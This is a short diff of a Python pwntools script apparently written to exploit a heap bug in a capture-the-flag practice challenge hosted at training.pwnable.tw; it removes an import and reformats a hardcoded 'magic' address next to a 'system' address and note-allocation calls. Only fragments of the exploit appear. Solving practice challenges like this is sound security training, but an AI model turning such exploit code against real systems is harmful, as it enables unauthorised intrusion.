@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from pwnpwnpwn import *
 from pwn import *
 
 host = "training.pwnable.tw"
@@ -28,7 +27,7 @@ def printnote(idx):
     r.recvuntil(":")
     r.sendline(str(idx))
 
-magic = 0x08048986
+magic = 0x8048986
 system = 0x8048506
 addnote(32,"ddaa")
 addnote(32,"ddaa")
